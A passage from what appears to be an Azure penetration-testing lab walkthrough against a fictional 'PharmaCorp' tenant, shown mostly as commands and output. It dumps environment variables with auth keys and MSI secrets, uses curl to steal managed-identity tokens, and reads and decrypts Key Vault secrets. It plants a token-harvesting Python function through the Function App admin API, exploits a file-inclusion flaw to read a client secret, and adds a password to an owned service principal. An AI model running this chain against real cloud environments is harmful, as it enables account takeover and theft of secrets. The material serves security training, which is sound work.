-Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-9.0.37\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-9.0.37\bin\bootstrap.jar;C:\Program Files\apache-tomcat-9.0.37\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-9.0.37\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"TMP=C:\local\TempRoleRoot=E:AZURE_JETTY93_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904" -Djetty.webapps="d:\home\site\wwwroot\webapps" -jar "D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904\start.jar" etc\jetty-logging.xmlCommonProgramFiles(x86)=C:\Program Files (x86)\Common FilesAZURE_TOMCAT10_CMDLINE=-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files\apache-tomcat-10.1.16\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files\apache-tomcat-10.1.16\bin\bootstrap.jar;C:\Program Files\apache-tomcat-10.1.16\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files\apache-tomcat-10.1.16" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.BootstrapWEBSITE_CATALINA_MAXCONNECTIONS=10000WEBSITE_CATALINA_MAXTHREADS=200WEBSITE_HTTPLOGGING_RETENTION_DAYS=0WEBSITE_TOMCAT_CONNECTION_TIMEOUT=220000WEBSITE_TOMCAT_LOGS_ROTATABLE=truewindir=C:\WindowsNUMBER_OF_PROCESSORS=1OS=Windows_NTProgramFiles=C:\Program FilesComSpec=C:\Windows\system32\cmd.exePATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL;.PY;.PYWAZURE_TOMCAT8_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-8.0.53\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files (x86)\apache-tomcat-8.0.53\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-8.0.53\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files (x86)\apache-tomcat-8.0.53" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.BootstrapALLUSERSPROFILE=C:\local\ProgramDataPSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files\WindowsPowerShell\Modules\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ResourceManager\AzureResourceManager\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ServiceManagement\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\Storage\APPDATA=C:\local\AppDataUSERDOMAIN=WORKGROUPPROCESSOR_LEVEL=6LOCALAPPDATA=C:\local\LocalAppDataResourceDrive=D:\AZURE_TOMCAT8_HOME=C:\Program Files (x86)\apache-tomcat-8.0.53PUBLIC=C:\Users\PublicScmType=NoneAPPSETTING_ScmType=NoneWEBSITE_SITE_NAME=analyticspharmacorpAPPSETTING_WEBSITE_SITE_NAME=analyticspharmacorpWEBSITE_AUTH_ENABLED=FalseAPPSETTING_WEBSITE_AUTH_ENABLED=FalseREMOTEDEBUGGINGVERSION=16.0.30709.132APPSETTING_REMOTEDEBUGGINGVERSION=16.0.30709.132FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0APPSETTING_FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0WEBSITE_AUTH_LOGOUT_PATH=/.auth/logoutAPPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logoutWEBSITE_AUTH_AUTO_AAD=FalseAPPSETTING_WEBSITE_AUTH_AUTO_AAD=FalseREGION_NAME=France CentralHOME=C:\homeHOME_EXPANDED=D:\DWASFiles\Sites\analyticspharmacorp\VirtualDirectory0LOCAL_EXPANDED=D:\DWASFiles\Sites\analyticspharmacorpwindows_tracing_flags=windows_tracing_logfile=WEBSITE_INSTANCE_ID=664cff65fb0830a8f00d20cbb06260ad645f7e6c54f889f5a82e638267647ba0WEBSITE_HTTPLOGGING_ENABLED=0WEBSITE_SCM_ALWAYS_ON_ENABLED=1WEBSITE_ISOLATION=picoWEBSITE_OS=windowsWEBSITE_DEPLOYMENT_ID=analyticspharmacorpWEBSITE_INFRASTRUCTURE_IP=10.11.1.1WEBSITE_COMPUTE_MODE=DedicatedWEBSITE_SKU=BasicWEBSITE_ELASTIC_SCALING_ENABLED=0WEBSITE_SCM_SEPARATE_STATUS=1WEBSITE_IIS_SITE_NAME=analyticspharmacorpWEBSITE_APPSERVICEAPPLOGS_TRACE_ENABLED=trueWEBSITE_CHANGEANALYSISSCAN_ENABLED=1MicrosoftInstrumentationEngine_LatestPath=C:\Program Files (x86)\SiteExtensions\InstrumentationEngine\1.0.43JAVA_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392SITE_BITNESS=x86WEBSITE_AUTH_ENCRYPTION_KEY=FC8E438475F00427819DB182616D53741FAFEA859E7310EB693BAF1F5A4DCB0FWEBSITE_AUTH_SIGNING_KEY=7B45FA4108334C68A07D3D6A1627A95E8A171A535ABDEB6162C8EDB0A1F848CEWEBSITE_PROACTIVE_AUTOHEAL_ENABLED=TrueWEBSITE_PROACTIVE_STACKTRACING_ENABLED=TrueWEBSITE_PROACTIVE_CRASHMONITORING_ENABLED=TrueWEBSITE_CRASHMONITORING_USE_DEBUGDIAG=TrueWEBSITE_DYNAMIC_CACHE=1WEBSITE_FRAMEWORK_JIT=1WEBSITE_HOME_STAMPNAME=waws-prod-par-021WEBSITE_CURRENT_STAMPNAME=waws-prod-par-021WEBSOCKET_CONCURRENT_REQUEST_LIMIT=350WEBSITE_VOLUME_TYPE=PrimaryStorageVolumeWEBSITE_OWNER_NAME=aac02f74-b0d2-45d2-8fbc-8d33f274116f+Analytics-FranceCentralwebspaceWEBSITE_RESOURCE_GROUP=analyticsWEBSITE_CONTAINER_READY=1WEBSITE_PHYSICAL_MEMORY_MB=1996WEBSITE_JAVA_MAX_HEAP_MB=1397WEBSITE_STACK=TOMCATWEBSITE_PLATFORM_VERSION=101.1.7.100REMOTEDEBUGGINGPORT=REMOTEDEBUGGINGBITVERSION=vx86WEBSITE_LOCALCACHE_ENABLED=FalseWEBSITE_HOSTNAME=analyticspharmacorp.azurewebsites.netWEBSITE_RELAYS=WEBSITE_REWRITE_TABLE=MSI_ENDPOINT=http://127.0.0.1:41407/msi/token/MSI_SECRET=FB0C3E41E5B24ACC9CB6D282CC3603A6IDENTITY_ENDPOINT=http://127.0.0.1:41407/msi/token/IDENTITY_HEADER=FB0C3E41E5B24ACC9CB6D282CC3603A6HTTP_PLATFORM_PORT=4431_EXECJAVA="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin\java.exe"_RUNJAVA=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin\java.exe_RUNJDB=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u392\bin\jdb.exe
```

- The auditor discovers that the `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` variables are present.
```
<snip>

IDENTITY_ENDPOINT=http://127.0.0.1:41407/msi/token/IDENTITY_HEADER=FB0C3E41E5B24ACC9CB6D282CC3603A6

<snip>
```

- This information can be used to request Access Tokens for the Managed Identity for the compromised App Service. The auditor can request Access Tokens for ARM and MS Graph using the following payloads.
	- `curl "http://127.0.0.1:41407/msi/token/?resource=https://management.azure.com&api-version=2017-09-01" -H secret:"FB0C3E41E5B24ACC9CB6D282CC3603A6"`
	- `curl "http://127.0.0.1:41407/msi/token/?resource=https://graph.microsoft.com&api-version=2017-09-01" -H secret:"FB0C3E41E5B24ACC9CB6D282CC3603A6"`

- The auditor can then use the stolen Access Tokens to authenticate to Azure as that Managed Identity.
```powershell
PS C:\Auditor> $armtoken = 'eyJ0e...25E9I8f5w'
PS C:\Auditor> $msgraphtoken = 'eyJ0eX...cGJGNj4w'
PS C:\Auditor> Connect-AzAccount -AccountId '3329FEA7-642E-4C09-B1AD-D8EDBE140267' -AccessToken $armtoken -MicrosoftGraphAccessToken $msgraphtoken

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
3329FEA7-642E-4C09-B1AD-D8EDBE140267 PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
```

- The auditor can now list accessible Azure Resources as that Managed Identity.
```powershell
PS C:\Auditor> Get-AzResource


Name              : compositionsecrets
ResourceGroupName : Composition
ResourceType      : Microsoft.KeyVault/vaults
Location          : francecentral
ResourceId        : /subscriptions/aac02f74-b0d2-45d2-8fbc-8d33f274116f/resourceGroups/Composition/providers/Microsoft.KeyVault/vaults/compositionsecrets
Tags              :
```

- The Managed Identity has access to a Key Vault. In order to access it, the auditor needs to request an access token for this type of Resource using the payload `curl "http://127.0.0.1:41407/msi/token/?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:"FB0C3E41E5B24ACC9CB6D282CC3603A6"` in the vulnerable web application. The auditor will then use this token to authenticate to Azure as the compromised Managed Identity.
```powershell
PS C:\Auditor> $keyvaulttoken = 'eyJ0e...jVmP1PQ'
PS C:\Auditor> Connect-AzAccount -AccountId '3329FEA7-642E-4C09-B1AD-D8EDBE140267' -AccessToken $armtoken -MicrosoftGraphAccessToken $msgraphtoken -KeyVaultAccessToken $keyvaulttoken

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
3329FEA7-642E-4C09-B1AD-D8EDBE140267 PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
```

- The auditor can list stored Keys in the Key Vault.
```powershell
PS C:\Auditor> Get-AzKeyVaultKey -VaultName compositionsecrets


Vault/HSM Name : compositionsecrets
Name           : EncryptionKey
Version        :
Id             : https://compositionsecrets.vault.azure.net:443/keys/EncryptionKey
Enabled        : True
Expires        :
Not Before     :
Created        : 6/30/2022 2:43:34 PM
Updated        : 6/30/2022 2:43:34 PM
Recovery Level : Recoverable+Purgeable
Tags           :
```

- The auditor can also list stored Secrets in the Key Vault.
```powershell
PS C:\Auditor> Get-AzKeyVaultSecret -VaultName compositionsecrets


Vault Name   : compositionsecrets
Name         : compositionprocessing-masterkey
Version      :
Id           : https://compositionsecrets.vault.azure.net:443/secrets/compositionprocessing-masterkey
Enabled      : True
Expires      :
Not Before   :
Created      : 5/2/2023 10:11:20 AM
Updated      : 5/2/2023 10:11:20 AM
Content Type :
Tags         :
```

- The auditor can retrieve the plaintext value of the Secret.
```powershell
PS C:\Auditor> Get-AzKeyVaultSecret -VaultName compositionsecrets -Name compositionprocessing-masterkey -AsPlainText
MtK4CFkZF0Hx11MKfD3nz0FHfKMRJzIeuKY/T+O9Y/VXOkTc8LtpzqNgBD8ObB0ZEqpJgwAXBk1xHbK/JbT4lWEHikNKq5o3g86SyiSKEyYYh//cVU6yc1SkprKCPuNYWXQqosvq1Y4r3zfRsL5C4dKWaatBNDj2LhuH5bFxOlYhAlCmMWSRXm44mJYBrbFlplvIsAX/c40tRXL6HpgTxA++FWyoXfwUtDqhHcNL/cH0BbX/bQAaxSoQT1frw2P1DZvVfqFEdKBIJKMBP4npMWLL1WB9XwzMT4CEUAoUHSxxk02ShKdor5cigUPK52jqEzEPTNmZduR8s2/9dBRM7g==
```

- The auditor attempts to decrypt this encrypted blob using the stored Key in the Key Vault.
```powershell
PS C:\Auditor> $EncryptedString = 'MtK4CFkZF0Hx11MKfD3nz0FHfKMRJzIeuKY/T+O9Y/VXOkTc8LtpzqNgBD8ObB0ZEqpJgwAXBk1xHbK/JbT4lWEHikNKq5o3g86SyiSKEyYYh//cVU6yc1SkprKCPuNYWXQqosvq1Y4r3zfRsL5C4dKWaatBNDj2LhuH5bFxOlYhAlCmMWSRXm44mJYBrbFlplvIsAX/c40tRXL6HpgTxA++FWyoXfwUtDqhHcNL/cH0BbX/bQAaxSoQT1frw2P1DZvVfqFEdKBIJKMBP4npMWLL1WB9XwzMT4CEUAoUHSxxk02ShKdor5cigUPK52jqEzEPTNmZduR8s2/9dBRM7g=='
PS C:\Auditor> $EncryptedStringSec = ConvertTo-SecureString $EncryptedString -AsPlainText -Force
PS C:\Auditor> Invoke-AzKeyVaultKeyOperation -Operation Decrypt -Algorithm RSA1_5 -Value $EncryptedStringSec -VaultName compositionsecrets -Name EncryptionKey | fl *


KeyId     : https://compositionsecrets.vault.azure.net/keys/EncryptionKey/e117ee35db434bc799fff01f5f36fea3
Result    : 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Algorithm : RSA1_5
```

- The auditor has retrieved the plaintext value of the encrypted blob which, according to the name of the Key Vault Secret, corresponds to the Master Key for the `compositionprocessing` Function App. This gives the auditor full access to the Function App. According to this [resource](https://www.netspi.com/blog/technical/cloud-penetration-testing/azure-function-apps/), the URI needed to query to list the source code files of the Function App follows this pattern: `https://<FUNCTIONAPPNAME>.azurewebsites.net/admin/vfs/home/site/wwwroot/HttpTriggerX`.
- The auditor can list all the functions in this Function App.
###### Potsman
```http
GET /admin/vfs/home/site/wwwroot HTTP/1.1
Host: compositionprocessing.azurewebsites.net
x-functions-key: 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Content-Type: application/octet-stream
```
###### PowerShell
```powershell
$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
}
}

Invoke-RestMethod @Params -UseBasicParsing
```

- The auditor can list (and read) all files inside a function.
###### Postman
```http
GET /admin/vfs/home/site/wwwroot/HTTPTrigger1 HTTP/1.1
Host: compositionprocessing.azurewebsites.net
x-functions-key: 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Content-Type: application/octet-stream
```
###### PowerShell
```powershell
$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/"
$Params = @{
"URI" = $URL
"Method" = "GET"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
}
}

Invoke-RestMethod @Params -UseBasicParsing
```

- The auditor can create a new function that once triggered, it will steal Access Tokens for the managed Identity of the Function App.
###### Postman
```http
PUT /admin/vfs/home/site/wwwroot/Student105/__init__.py HTTP/1.1
Host: compositionprocessing.azurewebsites.net
Content-Type: application/octet-stream
x-functions-key: 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Content-Length: 850

import logging, os
import azure.functions as func
def main(req: func.HttpRequest) -> func.HttpResponse:
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    management_token = os.popen(cmd).read()
    cmd = 'curl "%s?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    vault_token = os.popen(cmd).read()
    cmd = 'curl "%s?resource=https://graph.microsoft.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    graph_token = os.popen(cmd).read()
    res = management_token + vault_token + graph_token
    return func.HttpResponse(res, status_code=200)
```

###### PowerShell
```powershell
$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student105/__init__.py"
$Params = @{
"URI" = $URL
"Method" = "PUT"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
}
}
$Body = @"
import logging, os
import azure.functions as func
def main(req: func.HttpRequest) -> func.HttpResponse:
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    management_token = os.popen(cmd).read()
    cmd = 'curl "%s?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    vault_token = os.popen(cmd).read()
    cmd = 'curl "%s?resource=https://graph.microsoft.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    graph_token = os.popen(cmd).read()
    res = management_token + vault_token + graph_token
    return func.HttpResponse(res, status_code=200)
"@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body
```

- The auditor will also create the function configuration that defines the type of Trigger that the created malicious function needs to execute the code.
###### Postman
```http
PUT /admin/vfs/home/site/wwwroot/Student105/function.json HTTP/1.1
Host: compositionprocessing.azurewebsites.net
Content-Type: application/octet-stream
x-functions-key: 7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w==
Content-Length: 392

{
    "bindings": [
        {
            "authLevel": "anonymous",
            "type": "httpTrigger",
            "direction": "in",
            "name": "req",
            "methods": [
                "get",
                "post"
            ]
        },
        {
            "type": "http",
            "direction": "out",
            "name": "$return"
        }
    ]
}
```
###### PowerShell
```powershell
$URL = "https://compositionprocessing.azurewebsites.net/admin/vfs/home/site/wwwroot/Student105/function.json"
$Params = @{
"URI" = $URL
"Method" = "PUT"
"Headers" = @{
"Content-Type" = "application/octet-stream"
"x-functions-key" = "7JGHkhp1cWbNdZbZmEsdSqwwu2p-pbG7afGcc55qNyWUAzFufM557w=="
}
}
$Body = @"
{ "bindings": [ { "authLevel": "anonymous", "type": "httpTrigger", "direction": "in", "name": "req", "methods": [ "get", "post" ] }, { "type": "http", "direction": "out", "name": "`$return" } ] }
"@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body
```

- The auditor can now navigate to `https://compositionprocessing.azurewebsites.net/api/Student105` to trigger the Access Token theft function.
- The auditor can now use the stolen tokens to authenticate to Azure as the Managed Identity of the `compositionprocessing` Function App.
```powershell
PS C:\Auditor> $armtoken = 'eyJ0e...4mcrOyNDqYUA6Ig'
PS C:\Auditor> $msgraphtoken = 'eyJ0eXA...4_5l1afg'
PS C:\Auditor> $keyvaulttoken = 'eyJ0eX...Otv47FA'
PS C:\Auditor> Connect-AzAccount -AccountId 'c26cab12-8055-479d-a764-d656e4392577' -AccessToken $armtoken -MicrosoftGraphAccessToken $msgraphtoken -KeyVaultAccessToken $keyvaulttoken

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
c26cab12-8055-479d-a764-d656e4392577 PharmaCorp       e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
```

- The auditor can now enumerate accessible Azure Resources to the Managed Identity.
```powershell
PS C:\Auditor> Get-AzResource


Name              : phcvaccinedata
ResourceGroupName : VaccineComposition
ResourceType      : Microsoft.DocumentDb/databaseAccounts
Location          : eastus
ResourceId        : /subscriptions/aac02f74-b0d2-45d2-8fbc-8d33f274116f/resourceGroups/VaccineComposition/providers/Microsoft.DocumentDb/databaseAccounts/phcvaccinedata
Tags              :
                    Name                     Value
                    =======================  ==========
                    hidden-cosmos-mmspecial
```

# App Service 2 Enumeration & Exploitation - `resourcespharmacorp`
- This web app has a `Download Brochure` function that once used gives the following result.
```http
%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>

<snip>
```

- By intercepting the HTTP Request the auditor detects a URL parameter that directly calls the file system.
```http
POST /main?action=getData&fileName=downloadBrochure1.jsp HTTP/1.1
Host: resourcespharmacorp.azurewebsites.net
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://resourcespharmacorp.azurewebsites.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://resourcespharmacorp.azurewebsites.net/home.jsp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=6DE249AF0036CC43E0E01D4A9C9EC4C2; ARRAffinity=1331943e6af8ea95358449d5173946244504d36925f260085d3f167b036468e4
Connection: close


```

- The auditor can test the `fileName` URL parameter for possible LFI vulnerabilities, using the `C:\Windows\System32\drivers\etc\hosts` with forward slashes since this is a Java application. The final payload will be as bellow.
```http
POST /main?action=getData&fileName=C:/Windows/System32/drivers/etc/hosts HTTP/1.1
Host: resourcespharmacorp.azurewebsites.net
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://resourcespharmacorp.azurewebsites.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://resourcespharmacorp.azurewebsites.net/home.jsp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=6DE249AF0036CC43E0E01D4A9C9EC4C2; ARRAffinity=1331943e6af8ea95358449d5173946244504d36925f260085d3f167b036468e4
Connection: close


```

- The output returns the contents of the file which means that the web app is vulnerable to LFI.
```http
<snip>

<pre style="color: white; background-color: #152036;"> Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
?</pre>

<snip>
```

- The auditor can leverage the LFI vulnerability to request the contents of the `WEB-INF/web.xml` file that contains the configuration for Java web applications.
```http
POST /main?action=getData&fileName=WEB-INF/web.xml HTTP/1.1
Host: resourcespharmacorp.azurewebsites.net
Content-Length: 0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://resourcespharmacorp.azurewebsites.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://resourcespharmacorp.azurewebsites.net/home.jsp
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=6DE249AF0036CC43E0E01D4A9C9EC4C2; ARRAffinity=1331943e6af8ea95358449d5173946244504d36925f260085d3f167b036468e4
Connection: close


```

- The output contains the App ID and the Secret for the Managed Identity of the `resourcespharmacorp` web app.
```http
<snip>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1">
  <display-name>AzureAppServicePharmaLFI</display-name>

     <welcome-file-list>
    <welcome-file>home.jsp</welcome-file>
  </welcome-file-list>
  
  <servlet>
    <display-name>MainServlet</display-name>
    <servlet-name>MainServlet</servlet-name>
    <servlet-class>servlet.MainServlet</servlet-class>
  </servlet>
  
  <servlet-mapping>
    <servlet-name>MainServlet</servlet-name>
    <url-pattern>/main/*</url-pattern>
  </servlet-mapping>
  
  
  <context-param>
    <param-name>ClientSecret</param-name>
    <param-value>7e7730b1-29ab-4adf-bb20-7ae61987d01f:~9j8Q~f339gnUfSBxSO5yuQXM6ztfCBL8LPjXa3I</param-value>
  </context-param>

</web-app>?

<snip>
```

- The auditor uses those credentials to authenticate to Azure as that managed Identity. The actual secret is `K0K8Q~ExBQs5edLcwSaf1cSuJelrIP_~sdl5mbB_` which is provided by the lab support.
```powershell
PS C:\Auditor> $password = ConvertTo-SecureString 'K0K8Q~ExBQs5edLcwSaf1cSuJelrIP_~sdl5mbB_' -AsPlainText -Force
PS C:\Auditor> $appid = '7e7730b1-29ab-4adf-bb20-7ae61987d01f'
PS C:\Auditor> $creds = New-Object System.Management.Automation.PSCredential($appid, $password)
PS C:\Auditor> Connect-AzAccount -Credential $creds -ServicePrincipal -Tenant e0f999c1-86ee-47a0-bfd5-18470154b7cd
WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuser105\.Azure ). Please ensure that this directory has appropriate protections.

Account                              SubscriptionName TenantId                             Environment
-------                              ---------------- --------                             -----------
7e7730b1-29ab-4adf-bb20-7ae61987d01f                  e0f999c1-86ee-47a0-bfd5-18470154b7cd AzureCloud
```

- The auditor cannot enumerate accessible Azure Resources as that Managed Identity since it is not part of a Subscription.
```powershell
PS C:\Auditor> Get-AzResource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : CloseError: (:) [Get-AzResource], ValidationException
    + FullyQualifiedErrorId : Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```

- The auditor can enumerate other Azure App Services.
```powershell
PS C:\Auditor> Get-AzADApplication

DisplayName         Id                                   AppId
-----------         --                                   -----
mailapp             0a88da02-e9f4-428a-ab4e-aa94f12e1225 f0823e33-c430-4dd2-a56a-dca3c3a346a4
AbuseGraphAPIforCAP 0c9b0706-33fe-414a-955f-9b28284ce578 2b3b473a-1de0-4e44-a19c-5aa9001e02e3
Win Defend for M365 6f8867ed-c07d-4dff-a939-27b57873ebd6 1b258b49-6a48-457a-bf26-16747e9ef96e
AuthDemo            78e7dfaa-44f8-40bb-89d8-6d26c34a1928 175fff98-c013-4e4e-a58b-0b62de044432
resourcesapp        ee7a977f-a5f7-4790-b682-a6ea8e81701a 7e7730b1-29ab-4adf-bb20-7ae61987d01f
```

- The auditor can see if the current Managed Identity owns any of the applications listed above. The current `Get-AzADApplication` cmdlet fails to list the owner which means that the auditor has to use an MS Graph API call to list possibly owned objects according to the [official documentation](https://learn.microsoft.com/en-us/graph/api/serviceprincipal-list-ownedobjects?view=graph-rest-1.0&tabs=http). This can be done using either **Postman** or **PowerShell**.
###### Postman
```http
GET /v1.0/servicePrincipals/e0c80e68-d141-4bd4-9bba-37b0bd58a48b/ownedObjects HTTP/1.1
Host: graph.microsoft.com
Authorization: eyJ0...sePtg
```
###### PowerShell
```powershell
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$Params = @{ 
"URI" = "https://graph.microsoft.com/v1.0/servicePrincipals/e0c80e68-d141-4bd4-9bba-37b0bd58a48b/ownedObjects"
"Method" = "GET"
"Headers" = @{ 
"Authorization" = "Bearer $GraphToken"
"Content-Type" = "application/json"
}
}

$Result = Invoke-RestMethod @Params -UseBasicParsing
$Result.value | Select DisplayName,id,appid
```

```powershell
displayName id                                   appId
----------- --                                   -----
mailapp     0a88da02-e9f4-428a-ab4e-aa94f12e1225 f0823e33-c430-4dd2-a56a-dca3c3a346a4
mailapp     4a9a9c00-bf17-43d8-b437-fe8144c8df15 f0823e33-c430-4dd2-a56a-dca3c3a346a4
```

- The auditor discovered that the compromised Managed Identity owns the `mailapp` Application. This can be abused by adding a new Secret to the `mailapp`  Service Principal which will consequently allow the auditor to authenticate to Azure as this Service Principal/Managed Identity.
###### Postman
```http
POST /v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/addPassword HTTP/1.1
Host: graph.microsoft.com
Authorization: eyJ0eX...UzmKKBSg
```
###### PowerShell
```powershell
$GraphToken = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URL = "https://graph.microsoft.com/v1.0/servicePrincipals/4a9a9c00-bf17-43d8-b437-fe8144c8df15/addPassword"
$Params = @{
"URI" = $URL
"Method" = "POST"
"Headers" = @{
